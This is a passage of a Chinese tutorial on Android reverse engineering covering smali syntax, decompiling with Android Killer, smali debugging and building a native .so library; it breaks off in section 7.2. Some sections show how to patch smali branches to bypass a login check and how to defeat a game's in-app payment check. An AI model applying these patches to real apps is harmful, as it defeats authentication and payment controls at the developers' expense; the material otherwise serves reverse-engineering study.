so库存放位置，一般由NDK编译得到，常见于使用游戏引擎或JNI native调用的工程中 |\n| META-INF文件夹      | 存放工程一些属性文件，例如Manifest.MF                        |\n| res文件夹           | 资源目录2，asset和res都是资源目录但有所区别                  |\n| AndroidManifest.xml | Android工程的基础配置属性文件                                |\n| classes.dex         | Java代码编译得到的Dalvik VM能直接执行的文件                  |\n| resources.arsc      | 对res目录下的资源的一个索引文件，保存了原工程中strings.xml等文件内容 |\n| 其他文件夹 etc.     |                                                              |\n\n## 1.1 asset VS. res\n\nres目录下的资源文件在编译时会自动生成索引文件(R.java)，在Java代码中用R.xxx.yyy来引用；而asset目录下的资源文件不需要生成索引，在Java代码中需要用AssetManager来访问。\n\n一般来说，除了音频和视频资源(需要放在raw或asset下)，使用Java开发的Android工程使用到的资源文件都会放在res下；使用C++游戏引擎(或使用Lua Unity3D等)的资源文件均需要放在asset下。\n\n## 1.2 Dalvik字节码\n\nDalvik字节码是学习破解的基础。Dalvik是Google专门为Android操作系统设计的一个虚拟机，经过深度的优化。虽然Android上的程序是使用Java来开发的，但是Dalvik和标准的Java虚拟机JVM还是两回事。Dalvik VM是基于寄存器的，而JVM是基于栈的；Dalvik有专属的文件执行格式dex(dalvik executable)，而JVM则执行的是Java字节码。Dalvik VM比JVM速度更快，占用空间更少。\n\n通过Dalvik的字节码不能直接看到原来的逻辑代码，这是需要借助如Apktool或dex2jar+jd-gui工具来帮助查看。但是，需要注意的是最终我们修改APK需要操作的文件是`.smali`文件，而不是导出来的Java文件重新编译。\n\n## 1.3 Smali\n\nSmali是破解的重中之重。Smali，Baksmali分别是指安卓系统里的Java虚拟机(Dalvik)所使用的一种。dex格式文件的汇编器，反汇编器。其语法是一种宽松式的Jasmin/dedexer语法，而且它实现了`.dex`格式所有功能(注解，调试信息，线路信息等)。\n\n当对APK文件进行反编译后，便会生成此类的文件。在Dalvik字节码中，寄存器都是32位的，能够支持任何类型；64位类型(Long/Double)用2个寄存器表示。Dalvik字节码有两种类型：原始类型、引用类型(包括对象和数组)。\n\n| 原始类型简写 | 原始类型 |\n| ------------ | -------- |\n| B            | byte     |\n| C            | char     |\n| D            | double   |\n| F            | float    |\n| I            | int      |\n| J            | long     |\n| S            | short    |\n| V            | void     |\n| Z            | boolean  |\n| [XXX         | array    |\n| Lxxx/yyy     | object   |\n\n数组的表示方式是：在基本类型前加上中括号`[`，例如int数组和float数组分别表示为：`[I`，`[F`；对象的表示则以`L`作为开头，格式是`Lpackage/objectName;`(注意必须有个分号跟在后面)，例如String对象在Smali中为：`Ljava/lang/String;`，其中java/lang对应java.lang包，String就是定义在该包中的一个对象。\n\n或许有人问，既然类是用`LpackageName/objectName;`来表示，那类里面的内部类又如何在smali中引用呢？`LpackageName/objectName$subObjectName;`，也就是在内部类前加`$`符号。\n\n方法的定义一般为：\n\n​\t\t\t\t\t\t\t\tFunc-Name(Para-Type1Para-Type2Para-Type3...)Return-Type\n\n注意参数与参数之间没有任何分隔符。\n\n| 方法                                               | 意义                                              |\n| -------------------------------------------------- | ------------------------------------------------- |\n| hello ()V                                          | void hello()                                      |\n| hello (III)Z                                       | boolean hello(int, int, int)                      |\n| hello (Z[I[ILjava/lang/String;J)Ljava/lang/String; | String hello(boolean, int[], int[], String, long) |\n\n### 1.3.1 Smali基本语法\n\n| 基本语法                | 含义              |\n| ----------------------- | ----------------- |\n| .field private isFlag:Z | 定义变量          |\n| .method                 | 方法              |\n| .parameter              | 方法参数          |\n| .prologue               | 方法开始          |\n| .line 123               | 此方法位于第123行 |\n| invoke-super            | 调用父函数        |\n| const/high16 v0, 0x7f03 | 把0x7f03赋值给v0  |\n| invoke-direct           | 调用函数          |\n| return-void             | 函数返回void      |\n| .end method             | 函数结束          |\n| new-instance            | 创建实例          |\n| input-object            | 对象赋值          |\n| iget-object             | 调用对象          |\n| invoke-static           | 调用静态函数      |\n\n### 1.3.2 条件跳转分支\n\n| 用法                  | 含义                            |\n| --------------------- | ------------------------------- |\n| if-eq vA, vB, :cond_0 | 如果vA等于vB则跳转到:cond_0     |\n| if-ne vA, vB, :cond_0 | 如果vA不等于vB则跳转到:cond_0   |\n| if-lt vA, vB, :cond_0 | 如果vA小于vB则跳转到:cond_0     |\n| if-gt vA, vB, :cond_0 | 如果vA大于vB则跳转到:cond_0     |\n| if-ge vA, vB, :cond_0 | 如果vA大于等于vB则跳转到:cond_0 |\n| if-le vA, vB, :cond_0 | 如果vA小于等于vB则跳转到:cond_0 |\n| if-eqz vA, :cond_0    | 如果vA等于0则跳转到:cond_0      |\n| if-nez vA, :cond_0    | 如果vA不等于0则跳转到:cond_0    |\n| if-ltz vA, :cond_0    | 如果vA小于0则跳转到:cond_0      |\n| if-gtz vA, :cond_0    | 如果vA大于0则跳转到:cond_0      |\n| if-gez vA, :cond_0    | 如果vA大于等于0则跳转到:cond_0  |\n| if-lez vA, :cond_0    | 如果vA小于等于0则跳转到:cond_0  |\n\n### 1.3.3 Smali中的包信息\n\n`.class public Lcom/aaaaa;`：是com这个package下的一个类aaaaa\n\n`.super Lcom/bbbbb;`：继承自com.bbbbb这个类\n\n`.source \"ccccc.java\"`：由ccccc.java编译得到的smali文件\n\n一般来说在smali文件中是这样子的：\n\n```java\n# annotations\n.annotation system Ldalvik/annotation/MemberClasses;\nvalue={\nLcom/aaa$qqq;,\nLcom/aaa$www;\n}\n.end annotation\n```\n\n这个声明是内部类的声明：aaa这个类它有两个成员内部类——qqq和www。\n\n### 1.3.4 Smali中的成员变量\n\n格式：`.field public/private [static][final] varName:<类型>`\n\n对于不同的成员变量也有不同的指令。一般来说，获取的指令有：iget, sget, iget-boolean, sget-boolean, iget-object, sget-object等。操作的指令有：iput, sput, iput-boolean, sput-boolean, iput-object, sput-object等。\n\n没有`-object`后缀的表示操作的成员变量对象是基本数据类型，带`-object`表示操作的成员变量是对象类型。特别地，boolean类型则使用带`-boolean`的指令操作。\n\n例1：\n\n```\nsget-object v0, Lcom/aaa;->ID:Ljava/lang/String;\n```\n\nsget-object就是用来获取变量值并保存到紧接着的参数的寄存器中，本例中，它获取ID这个String类型的成员变量并放到v0这个寄存器中。注意，前面需要该变量所属的类的类型，后面需要加一个冒号和该成员变量的类型，中间的“->”表示所属关系。\n\n例2：\n\n```\niget-object v0, p0, Lcom/aaa;->view:Lcom/aaa/view;\n```\n\n可以看到iget-object指令比sget-object多了一个参数，就是该变量所在类的对象，p0即“this”。\n\n获取array的话可以用aget和aget-object，指令使用方法和上述一致。\n\n例3：put指令的使用和get指令是统一的如下：\n\n```\nconst/4 v3, 0x0\nsput-object v3, Lcom/aaa;->timer:Lcom/aaa/timer;\n```\n\n相当于`this.timer=null;`。\n\n注意，这里是因为赋值object所以是null；若是boolean的话应该是0。\n\n例4：\n\n```\n.local v0, args:Landroid/os/Message;\nconst/4 v1, 0x12\niput v1, v0, Landroid/os/Message;->what:l\n```\n\n相当于`args.what=18;`(args是Message的对象)。\n\n### 1.3.5 Smali中函数的调用\n\nsmali中的函数和成员变量一样也分为两种类型，分别为direct和virtual之分。那么direct method和virtual method有什么区别呢？\n\n简单来说，direct method就是private函数，其余的public和protected函数都属于virtual method。所以在调用函数时，有invoke-direct，invoke-virtual，另外还有invoke-static、invoke-super以及invoke-interface等几种不同的指令。\n\n当然其实还有invoke-XXX/range 指令的，这是参数多于4个的时候调用的指令，比较少见，了解下即可。\n\n#### invoke-static\n\n用于调用static函数的。\n\n例如：\n\n```\ninvoke-static {}, Lcom/aaa;->CheckSignature()Z\n```\n\n这里注意到invoke-static后面有一对大括号“{}”，其实是调用该方法的实例+参数列表，由于这个方法既不需参数也是static的，所以{}内为空。\n\n再看一个：\n\n```\nconst-string v0, \"NDKLIB\" \ninvoke-static {v0}, Ljava/lang/System;->loadLibrary(Ljava/lang/String;)V\n```\n\n这个是调用static void System.loadLibrary(String)来加载NDK编译的so库用的方法，同样也是这里v0就是参数“NDKLIB”了。\n\n#### invoke-super\n\n调用父类方法用的指令，一般用于调用onCreate、onDestroy等方法。\n\n#### invoke-direct\n\n调用private函数。\n\n```\ninvoke-direct {p0}, Landroid/app/TabActivity;-><init>()V\n```\n\n这里init()就是定义在TabActivity中的一个private函数。\n\n#### invoke-virtual\n\n用于调用protected或public函数，同样注意修改smali时不要错用invoke-direct或invoke-static。\n\n```\nsget-object v0, Lcom/dddd;->bbb:Lcom/ccc;\ninvoke-virtual {v0, v1}, Lcom/ccc;->Messages(Ljava/lang/Object;)V\n```\n\nv0是bbb:Lcom/ccc，v1是传递给Messages方法的Ljava/lang/Object参数。\n\n#### invoke-xxxxx/range\n\n当方法的参数多于5个时（含5个），不能直接使用以上的指令，而是在后面加上“/range”，range表示范围，使用方法也有所不同。\n\n```\ninvoke-direct/range {v0 .. v5}, Lcmb/pb/ui/PBContainerActivity;->h(ILjava/lang/CharSequence;Ljava/lang/String;Landroid/content/Intent;I)Z\n```\n\n需要传递v0到v5一共6个参数，这时候大括号内的参数采用省略形式，且需要连续。\n\n### 1.3.6 Smali中函数返回的结果的操作\n\n在Java代码中调用函数和返回函数结果可以用一条语句完成，而在Smali里则需要分开来完成，在使用上述指令后，如果调用的函数返回非void，那么还需要用到move-result（返回基本数据类型）和move-result-object（返回对象）指令：\n\n```\nconst-string v0, \"Eric\"\ninvoke-static {v0}, Lcmb/pbi;->t(Ljava/lang/String;)Ljava/lang/String;\nmove-result-object v2\n```\n\nv2保存的就是调用t方法返回String字符串。\n\n### 1.3.7 Smali中函数实体分析--if函数分析\n\n```java\n.method private ifRegistered()Z\n    .locals 2\t//在这个函数中本地寄存器的个数，2个\n    .prologue\n    const/4 v0, 0x1     // v0赋值为1\n    .local v0, tempFlag:Z\t\n    if-eqz v0, :cond_0            // 判断v0是否等于0，等于0则跳到cond_0执行\n    const/4 v1, 0x1            // 符合条件分支\n    :goto_0\t//标签\n    return v1\t//返回v1的值\n    :cond_0\t//标签\n    const/4 v1, 0x0            // cond_0分支\n    goto :goto_0\t//跳到goto_0执行 即返回v1的值  这里可以改成return v1  也是一样的\n.end method\n```\n\n### 1.3.8 Smali中函数实体分析--for函数分析\n\n```java\nconst/4 v0, 0x0   //v0 = 0;\n.local v0, i:I\n:goto_0\nif-lt v0, v3, :cond_0     //  v0小于v3 则跳到cond_0并执行分支 :cond_0\nreturn-void\n:cond_0                // 标签\niget-object v1, p0, Lcom/aaa/MainActivity;->listStrings:Ljava/util/List;        // 引用对象\nconst-string v2, \"Eric\"\ninvoke-interface {v1, v2}, Ljava/util/List;->add(Ljava/lang/Object;)Z    // List是接口, 执行接口方法add\nadd-int/lit8 v0, v0, 0x1　　　　// 将第二个v0寄存器中的值，加上0x1的值放入第一个寄存器中, 实现自增长\ngoto :goto_0                // 回去:goto_0标签\n```\n\n### 1.3.9 课后习题\n\n翻译成Java代码。\n\n```java\n.local 4                   //本地寄存器4个，即v0,v1,v2,v3\nconst/4 v2, 0x1            //4字节常量v2=1\nconst/16 v1, 0x10          //16字节常量v1=16\n:local v1, \"length\":I      //本地寄存器int length=v1\nif-nez v1，:cond_1        //如果v1不等于0，这跳转至cond_1\n:cond_0                    //cond_0标签\n:goto_0                    //goto_0标签\nreturn v2                  //返回v2的值\n:cond_1                    //开始执行cond_1标签代码\nconst/4 v0,0x0             //4字节常量v0=0\n:local v0, \"i\":I           //本地寄存器int i=v0\n:goto_1                    //开始执行goto_1标签代码\nif-lt v0, v1, :cond_2      //如果v0小于v1,则跳转至cond_2\nconst/16 v3,0x28           //接上：如果v0大于等于v1，则执行下面语句： 16字节常量v3=40\nif-le v1,v3, :cond_0       //接上：如果v1小于等于v3,则跳转至cond_0,即返回v2的值\nconst/4 v2, 0x0            //接上：如果v1大于v3,则4字节常量v2=0\ngoto:goto_0                //跳转至goto_0,即返回v2的值\n:cond_2                    //cond_2标签\nxor-int/lit8 v1, v1, 0x3b  //将第二个v1寄存器中的值与0x3b（59）进行异或运算，得到的值赋值给第一个v1寄存器中\nadd-int/lit8 v0, v0, 0x1   //将第二个v0寄存器中的值加上0x1(1)，所得的值放入第一个v0寄存器中\ngoto:goto_1                //跳转值goto_1标签，这里可以看到cond_2实际上是一个for循环，而不是简单的IF判断\n```\n\n```java\nv2 = 1;\nv1 = 16;\nif (v1 != 0)\n{\n    v0 = 0;\n\tfor(v0 < v1)\n    {\n\t\tv1 = v1 ^ 59;\n\t\tv0 = v0 + 1;\n\t}\n\tv3 = 40;\n\tif(v1 <= v3)\n\t{\n        return v2;\n\t}\n\tv2 = 0;\n\treturn v2;\n}\n```\n\n## 1.4 寄存器\n\n在smali里的所有操作都必须经过寄存器来进行：\n\n- 本地寄存器用v开头数字结尾的符号来表示，如v0, v1, v2...\n- 参数寄存器则使用p开头数字结尾的符号来表示，如p0, p1, p2...\n\n特别注意的是，p0不一定是函数中的第一个参数，在非static函数中，p0代指“this”，p1表示函数的第一个参数，p2表示函数的第二个参数...而在static函数中p0才对应第一个参数(因为Java的static方法中没有this方法)。\n\n### 1.4.1 简单对象分析\n\n```java\nconst/4 v0, 0x1\niput-boolean v0, p0, Lcom/aaa;->IsRegistered:Z\n```\n\n它使用了本地寄存器v0，并把值0x1存到v0中。用iput-boolean这个指令把v0中存的值存放到com.aaa.IsRegistered这个成员变量中。即相当于：`this.IsRegistered=true;`。\n\n# 2. 破解第一个Android程序 \n\n破解Android程序需要静态反编译程序Android Killer，打开后第一步配置JDK的安装路径。\n\n{% asset_img 配置jdk.png 配置jdk %}\n\n从 https://down.52pojie.cn/Tools/Android_Tools/ShakaApktool_3.0.0-20170503-release.jar 下载ShakaApktool_3.0.0-20170503-release.jar，将它放到`AndroidKiller_v1.3.1\\bin\\apktool\\apktool`目录下，按照下图完成操作。\n\n{% asset_img 更改apktool.png 更改apktool %}\n\n将需要反编译的`.apk`文件拖进Android Killer后会自动反编译，但最后显示“正在反编译APK源码，请稍等...”时可能会卡住，需要关闭软件再次打开。\n\n{% asset_img 异常.png 异常 %}\n\n找到历史工程重新打开`.apk`文件，点击入口即可看到smali文件。\n\n{% asset_img 成功反编译.png 成功反编译 %}\n\n如果经常卡住可以试试替换AK目录下的`rtl230.bpl` https://www.52pojie.cn/thread-658341-1-1.html 。\n\n{% asset_img smali流程分析.png smali流程分析 %}\n\n既然了解了流程，就可以动手破解程序了。\n\n第一种：知道了账户密码，可直接拿那个账户密码登录。\n\n```\n用户名：hfdcxy\n密码：1234\n```\n\n第二种：将验证账户密码的两条跳转语句修改。\n\n```java\nif-eqz v0, :cond_0\t\t->\tif-nez v0, :cond_0\nif-eqz v0, :cond_0\t\t->\tif-nez v0, :cond_0\n```\n\n第三种：直接将验证账户密码的两条跳转语句删除。\n\n第四种：用goto语句直接跳到登录成功处。\n\n```java\n    move-result v0\n    \n    goto :goto_3\t\t\t#添加goto\n\n    if-eqz v0, :cond_0\n\n    const-string v0, \"1234\"\n\n    invoke-virtual {p2, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z\n\n    move-result v0\n\n    if-eqz v0, :cond_0\n\n    .line 30\n    :goto_3\t\t\t\t\t#添加goto\n    const-string v0, \"\\u767b\\u5f55\\u6210\\u529f\"\t\t#Unicode编码，“登录成功”\n```\n\nsmali修改完成后 Ctrl+S 保存，点击左上角的编译。\n\n{% asset_img 编译成功.png 编译成功 %}\n\n下载雷电模拟器 http://www.ldmnq.com/ 充当手机，可以在电脑上运行`.apk`文件，找到雷电模拟器设备，安装。\n\n{% asset_img 安装.png 安装apk %}\n\n然后在雷电模拟器中运行程序，输入错误的用户名和密码会提示登录成功，说明破解成功。\n\n# 3. 破解第一个Android游戏\n\n运行一下程序，发现购买会出现“支付失败”字样，其Unicode为`\\u652F\\u4ED8\\u5931\\u8D25`。拖入AK反编译，按照下图搜索字符串，但没有找到。\n\n{% asset_img 搜索失败.png 搜索失败 %}\n\n再找“失败”，可直接在搜索框输入“失败”，再点左下角的编码转换即可转换为Unicode码。找到很多有关“失败”的字符串，一一排除。最后找到一个“购买失败”。\n\n{% asset_img 购买失败.png 购买失败 %}\n\n再上下看看可以看到有“购买取消”、“购买成功”等字样。如果看smali难看懂，可以转换成java源码，但转换的源码可读性比较差，还是建议读smali，而且修改必须是在smali里修改才可以成功编译。\n\n{% asset_img 转换java源码.png 转换java源码 %}\n\n```java\n.method public payResultCancel()V\n...\n.end method\t\t#以上为支付取消的代码\n    \n.method public payResultFalse()V\n...\n.end method\t\t#支付失败\n    \n.method public payResultSuccess()V\n...\n.end method\t\t#支付成功\n```\n\n首先来个简单粗暴的方法，直接将`public void payResultSuccess()`方法里的代码全都复制到`public void payResultCancel()`和`public void payResultFalse()`中。再删除可能会产生费用的危险权限：在`AndroidManifest.xml`里搜索（或者直接搜索）`android.permission.SEND_SMS` 和 ` android.permission.CALL_PHONE `，删掉 `<uses-permission android:name=\"android.permission.SEND_SMS\"/>` 和 `<uses-permission android:name=\"android.permission.CALL_PHONE\"/>` 即可。\n\n第二种方法，再观察一下代码，到底是哪里开始分岔到“购买成功”、“购买取消”、“购买失败”的呢？搜索payResultFalse找到有跳转处的地方。\n\n{% asset_img 修改代码.png 修改代码 %}\n\n同上，再删除可能会产生费用的危险权限，编译。\n\n# 4. AS动态调试smali代码\n\n下载Android Studio，这里有个非常大的坑耗了我两天时间，由于在官网下载不了，导致我去别的地方下载了无数版本的AS，最后安装smalidea插件造成各种问题。\n\n解决办法：把官网链接https改为http即可。\n\nhttp://redirector.gvt1.com/edgedl/android/studio/install/2021.1.1.22/android-studio-2021.1.1.22-windows.exe\n\n动态调试需要smalidea插件，下载最新版的`smalidea-0.06.zip`压缩包。最后直接导入插件，不要解压。安装、导入自行百度。可以新建一个项目直接连入模拟器看AS是否能够正常运行。第一次新建项目花费时间长一点，我不会说我新建一个项目花了15分钟！！！\n\n将`.apk`文件拖进AK反编译成`.smali`文件，文件入口为` hfdcxy.com.myapplication.MainActivity`。在`application`标签里找` android:debuggable=\"true\" `这句代码。如果没有这句代码就调试不了，如果是`false`则改为`true`，重新编译签名。将新编译好的`.apk`安装在模拟器上。\n\n{% asset_img debuggertrue.png debuggertrue %}\n\n在`.apk`文件右键，打开文件路径。\n\n{% asset_img 打开文件路径.jpg 打开文件路径 %}\n\n把整个project目录复制到某处，用AS导入。给smali目录设置Sources Root。\n\n{% asset_img sourcesroot.jpg sourcesroot %}\n\nRun->Edit configurations->+->Remote JVM Debug->设置Name，设置端口号为8700。\n\n{% asset_img 设置remote.png 设置remote %}\n\n打开CMD，运行以下命令，将会显示以下信息。\n\n```\nC:\\Users\\dell>adb devices\nList of devices attached\nemulator-5554   device\n\nC:\\Users\\dell>adb shell am start -D -n hfdcxy.com.myapplication/hfdcxy.com.myapplication.MainActivity\nStarting: Intent { cmp=hfdcxy.com.myapplication/.MainActivity }\n```\n\n如果显示“'adb' 不是内部或外部命令，也不是可运行的程序或批处理文件。”请看 https://www.cnblogs.com/plsmile/p/11172693.html\n\n执行完第二条adb后，模拟器进入调试页面，记下PID为2160。不要点模拟器任何东西！！\n\n{% asset_img 调试页面.png 调试页面 %}\n\n绑定远程调试窗口：\n\n```\nC:\\Users\\dell>adb forward tcp:8700 jdwp:2160\n8700\n```\n\n回到AS设置断点，Run->Attch Debugger to Android Process\n\n{% asset_img 下断.png 下断点 %}\n\n{% asset_img 下断2.png 下断点 %}\n\n回到模拟器，输入用户名和密码，点击登录。AS停在断点处，看到我们刚才输入的变量。\n\n{% asset_img 断点3.png 下断点 %}\n\n单步F8，运行F9，与OD一样。可以下多几个断点，看寄存器的值，但需要自己添加想看的寄存器。\n\n{% asset_img 寄存器值.png 寄存器值 %}\n\n# 5. 在smali代码中插入Log\n\n新建一个项目在MainActivity.java里面写一段switch case语句。注意，新建时语言要选择Java。\n\n```java\npublic class MainActivity extends AppCompatActivity\n{\n    String name;\n    @Override\n    protected void onCreate(Bundle savedInstanceState)\n    {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n        name = \"v5le0n9\";\n        switch(name)\n        {\n            case \"v5le0n9\":\n                Log.i(\"Hello\",\"v5le0n9哈哈\");\n                break;\n            case \"l30n9ry0n\":\n                Log.i(\"Hello\",\"l30n9ry0n啦啦\");\n                break;\n            default:\n                Log.i(\"Hello\",\"没有符合的name值\");\n                break;\n        }\n    }\n}\n```\n\n点击三角符号运行，或Shift+F10，程序被安装到模拟器上。在Logcat查找“hello”，找到对应Log。\n\n{% asset_img Log.png Log %}\n\n要想`.apk`文件保存在电脑上，按照下图操作。\n\n{% asset_img buildapk.jpg build apk %}\n\n在`D:\\Java\\Android\\MyApplication\\app\\build\\intermediates\\apk\\debug`找到`.apk`文件。拖进AK反编译。点击入口进入MainActivity.smali，分析代码。\n\n注意，能修改smali文件的前提是smali文件没有丢失，否则修改了也不能编译成功。再注意，为什么我们编写出来的程序放到AK反编译会显示文件已丢失？可能是因为Android Studio2.0+的Instant Run导致的。\n\n解决方法：关闭Android Stuio的Instant Run：File -> Setting -> Build, Execution，Deployment -> Debugger -> HotSwap ，取消选中，点击OK。点击Build -> APK重新打包。\n\n{% asset_img instantrun.png instantrun %}\n\n结果还是不行！！直接生成release版本的apk试试，build ->  Geberate signed apk -> APK。如果没有keystore则需要创建一个新的。\n\n创建keystore看 https://blog.csdn.net/qq_24349695/article/details/78540982\n\n在点击finish时又给我抛出错误：`Error:Execution failed for task ‘:app:lintVitalRelease’`，解决方法：\n\n在app的build.gradle里的android{}中添加如下代码，然后再次运行Generate Signed Apk。例如： \n\n```java\nandroid{\n    lintOptions {\n        checkReleaseBuilds false\n        abortOnError false\n    }\n}\n```\n\n这次用release版本终于没有丢失smali文件了。已知代码运行出现的Log是`:cond_1`里面的信息，所以在`:cond_1`添加我们想看到的信息，保存编译。\n\n{% asset_img 添加smali代码.png 添加smali代码 %}\n\nAK连上模拟器，因为模拟器之前有我们在AS直接安装的程序，所以先卸载，再编译安装修改过的程序。回到AS就可以看到多了一条Log信息，但AS中的java语言并没有被修改。\n\n{% asset_img ASLog.png AS中多了一条Log信息 %}\n\n**所以Log有什么用呢？很多情况下插入Log是为了打印出程序中某个变量的值。**\n\n用以下程序完成三个任务：\n\n1. 添加Log打印出fun2,fun3的值 (其实就是函数的返回值)\n\n2. 添加Log打印出fun3里面String类型str的值\n\n3. 添加Log打印出fun3里面int类型value3的值 \n\n```java\n//MainActivity.java\npublic class MainActivity extends AppCompatActivity {\n \n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n        fun1();\n        fun2();\n        fun3();\n        Log.i(\"这个值是\",String.valueOf(fun1()));\n \n    }\n    public int fun1()\n    {\n        int value = Test.value;\n        return value;\n    }\n    public int fun2()\n    {\n        int value2 = Test.value2;\n        return value2;\n    }\n    public String fun3()\n    {\n        String str = Test.str;\n        String str2 = Test.str2;\n        int value3 = Test.value3;\n        return str2;\n    }\n}\n```\n\n```java\n//Test.java\npublic class Test {\n    public static int value = 888;\n    public static int value2 = 777;\n    public static int value3 = 666;\n    public static String str = \"www.52pojie.cn\";\n    public static String str2 = \"码完代码去看东方明珠\";\n}\n```\n\n{% asset_img 1.png 运行程序 %}\n\n一样release版本拿去AK反编译。\n\n任务一：添加Log打印出fun2, fun3的值\n\n{% asset_img 2.png 打印fun1的值 %}\n\n`.line 17`是执行Log代码的内容，有趣的是在AS中`Log.i(\"这个值是\",String.valueOf(fun1()));`刚好是第17行。\n\n由于fun2和fun1的返回值类型一致，所以可直接复制这些代码，区别只是将fun1改为fun2。\n\n{% asset_img 3.png 返回fun2的值 %}\n\nfun2和fun3函数都是int类型，通过`String.valueOf`这个函数转换成的String类型。但是fun3这个函数本身就是String类型，这里如果还通过`String.valueOf`函数转换的话程序会报错。所以将执行`String.valueOf`的代码去掉即可。\n\n{% asset_img 4.png 返回fun3的值 %}\n\n保存->卸载->编译->安装。\n\n{% asset_img 5.png Log显示fun1,fun2,fun3返回值 %}\n\n任务二：添加Log打印出fun3里面String类型str的值\n\n{% asset_img 6.png fun3中的smali代码 %}\n\n翻译一下就是：\n\n```java\npublic String fun3()\n{\n    String v0 = str;\n\tString v0 = str2;\n\tint v1 = value3;\n\treturn v0;\n}\n```\n\n即str的值被str2覆盖了，所以可以直接删掉`.line 33`代码。\n\n{% asset_img 7.png 注释33行代码 %}\n\n{% asset_img 8.png 显示str的值 %}\n\n任务三：添加Log打印出fun3里面int类型value3的值 \n\n将fun3的smali代码按照fun2的smali代码修改返回值类型。\n\n{% asset_img 9.png 修改返回值类型 %}\n\n{% asset_img 11.png 修改返回值类型 %}\n\n最后还要添加修改Log处的代码。\n\n{% asset_img 10.png 修改返回值类型 %}\n\n{% asset_img 12.png 显示value3的值 %}\n\n# 6. 编写第一个so\n\nAndroid开发中，我们经常会用到`.so`文件。原因有很多，比如部分方法不想暴露，如加密规则。比如部分秘钥需要存储，哪怕最简单的一个String我们使用.so调用获取这个String，也比直接明文写在代码中要来的安全。那么逆向破解也是一样， 为了避免以后破解so时知其然而不知其所以然，要破解一个so就得先学习这个so是怎么编写的。\n\n生成so文件需要NDK，由于本人安装NDK安装得太混乱了，出了各种各种的问题最后莫名其妙就成功了，所以以下步骤仅供参考，如果发现错误及时百度。\n\n创建一个native C++项目，一路next。\n\n{% asset_img C++.png C++ %}\n\n创建项目时会自动下载NDK，所以不用管。及时看build窗口信息，问题或异常会在build窗口显示。可以看到在`D:\\Java\\Android\\sdk\\ndk\\21.4.7075529`就下载好了ndk的21.4版本。\n\n打开Project的`local.properties`文件添加NDK路径。\n\n{% asset_img 配置DNK.png 配置NDK %}\n\n此时，可以在 File -> Project Structure -> SDK Location 就可以看到NDK路径了，说明NDK已经安装好并且能用了。\n\n{% asset_img 配置NDK.png 配置NDK %}\n\n那么现在就可以正式编写so文件了。在`MainActivity.java`的父目录里新建一个类，命名为`myJNI`。\n\n{% asset_img 新建类.jpg 新建一个类 %}\n\n声明native方法。这个类是java与C/C++交互的中介，方法由java声明，由C/C++实现。\n\n```java\npublic class myJNI {\n　　//加载so库\n    static {\n        System.loadLibrary(\"JniTest\");//so库名字\n    }\n　　//native方法\n    public static native String sayHello();//在so库里增加sayHello()功能\n}\n```\n\n在左侧栏右键`myJNI.java`，复制路径，在AS下面的终端编译`myJNI`类，生成`myJNI.class`文件。由于注释出错(?)，所以我把注释去掉了。\n\n```\njavac D:\\Java\\Android\\MyApplication4\\app\\src\\main\\java\\com\\example\\myapplication\\myJNI.java\n```\n\n{% asset_img 编译class文件.png 生成class文件 %}\n\n记住包名为`com.example.myapplication`，类名为`myJNI`。在AS终端上去到java目录，生成`.h`头文件。\n\n```\njavah -jni com.example.myapplication.myJNI\n```\n\n{% asset_img 生成头文件.png 生成头文件 %}\n\n将生成的头文件拖到cpp目录下，并且将`native-lib.cpp`强制删去。在cpp目录下新建`.c`文件。\n\n{% asset_img 新建main.jpg 新建c文件 %}\n\n将文件头包括进来，实现sayHello()方法。\n\n```c\n#include \"com_example_myapplication_myJNI.h\"\nJNIEXPORT jstring JNICALL Java_com_example_myapplication_myJNI_sayHello(JNIEnv *env, jclass jobj)\n{\n    return (*env)->NewStringUTF(env,\"hello 52pojie!\");\n}\n```\n\n由于我们使用CMake来生成so的, 所以要修改`CMakeLists.txt`来指定so名称和so的源文件的相对路径。点击上方“大象”同步一下。\n\n{% asset_img 修改名称.png so名称和so的源文件的相对路径 %}\n\n完成以上步骤之后，生成release版本的apk，要不然将来想要修改`.so`文件后不能在模拟器上运行。\n\n生成的so在`app\\build\\intermediates\\cmake\\debug\\obj\\`和`app\\build\\intermediates\\merged_native_libs\\debug\\out\\lib`和`app\\build\\intermediates\\stripped_native_libs\\debug\\out\\lib\\`。为什么相同的东西要分别放在三个地方，不懂。随便一个目录看看：\n\n{% asset_img jniso.png libjnitest.so %}\n\n发现这几个目录里面都有`libJniTest.so`，不同处理器使用的文件不一样。雷电模拟器就是x86架构的。\n\n- armeabi-v7a: 第7代及以上的 ARM 处理器。2011年15月以后的生产的大部分Android设备都使用它。\n- arm64-v8a: 第8代、64位ARM处理器，很少设备，三星 Galaxy S6是其中之一。\n- armeabi: 第5代、第6代的ARM处理器，早期的手机用的比较多。\n- x86: 平板、模拟器用得比较多。\n- x86_64: 64位的平板。\n\n 在`app/src/main`下新建`jnilib`目录, 并将生成的SO文件拷贝到该文件夹下。\n\n{% asset_img 拷贝so.png SO文件拷贝到该文件夹下 %}\n\n打开`MainActivity.java`插入一条log来调用so中的`sayHello`方法，并连接模拟器调试。\n\n{% asset_img sayhello.png 插入一条log %}\n\n{% asset_img 52pj.png 插入一条log %}\n\n# 7. IDA破解第一个so\n\n## 7.1 预备知识与环境配置\n\n下载最新版`apktool.jar`和`apktool.bat`一起放到`C:\\Windows`目录下，不想下载也可以在AK目录下找到它们，大概在`D:\\Java\\AndroidKiller_v1.3.1\\bin\\apktool`，再放到`C:\\Windows`。不想放到`C:\\Windows`也可以把环境变量设到上面路径中，随你喜欢。反正最后的结果是可以在命令窗口使用apktool。记住两个关键命令：\n\n```java\napktool d test.apk\t\t//解包\napktool b test\t\t\t//重打包\n```\n\n{% asset_img 解包.png 解包 %}\n\n{% asset_img 重打包.png 重打包 %}\n\n重打包后的apk由于没有签名，所以这里需要对重打包后的apk进行签名后才能在手机上安装并运行。打开AK，工具->APK签名，将要签名的apk拖拉到软件中进行签名，点执行后将会在当前目录生成`hello_sign.apk`。\n\n{% asset_img 签名.png 签名 %}\n\n## 7.2 破解so文件\n\n打开AS，在`Logcat`模块连接好模拟器，将`.apk`文件安装到模拟器上，运行`.apk`，回到`Logcat`搜索“52pojie”。\n\n{% asset_img 52pojie.png 调用sayhello方法 %}\n\n我们的目的是修改这句话。\n\n在主机上将`.apk`解包后，进入lib目录，发现有4个目录。\n\n{% asset_img lib.png lib目录 